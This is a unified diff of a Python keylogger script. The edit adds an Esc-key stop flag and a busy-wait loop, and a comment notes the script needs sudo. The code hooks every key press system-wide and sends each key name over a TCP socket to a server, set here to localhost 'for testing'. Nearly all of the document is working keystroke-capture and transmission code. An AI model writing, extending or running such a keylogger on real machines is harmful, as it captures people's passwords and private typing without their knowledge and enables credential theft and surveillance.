@@ -1,5 +1,8 @@
-import keyboard
+import keyboard  # Must be run as sudo to function properly
 import socket
+
+# Flag to indicate when to stop the keylogger
+stop_flag = False
 
 # Function to send keystrokes to the server
 def send_keystrokes_to_server(client_socket, keyboard_input):
@@ -12,11 +15,18 @@ def send_keystrokes_to_server(client_socket, keyboard_input):
 
 # Function to handle each key event
 def on_key_event(event, client_socket):
+    global stop_flag
     if event.event_type == 'down':  # Only send key press events
-        send_keystrokes_to_server(client_socket, event.name)
+        if event.name == 'esc':  # Check if the 'Esc' key is pressed
+            print("Esc key pressed. Stopping keylogger...")
+            stop_flag = True  # Set the stop flag to indicate that the keylogger should stop
+            keyboard.unhook_all()  # Unhook all keyboard events to stop the keylogger
+        else:
+            send_keystrokes_to_server(client_socket, event.name)
 
 # Function to start the keylogger
 def start_keylogger():
+    global stop_flag
     host = '127.0.0.1'  # Server address (localhost for testing)
     port = 5000         # Port to connect to the server
 
@@ -32,8 +42,9 @@ def start_keylogger():
         # Hook all key events
         keyboard.hook(lambda event: on_key_event(event, client_socket))
         
-        # Block forever, like listener.join()
-        keyboard.wait()
+        # Loop until the stop flag is set
+        while not stop_flag:
+            pass
     except Exception as e:
         print(f"Error connecting to the server: {e}")
     finally:
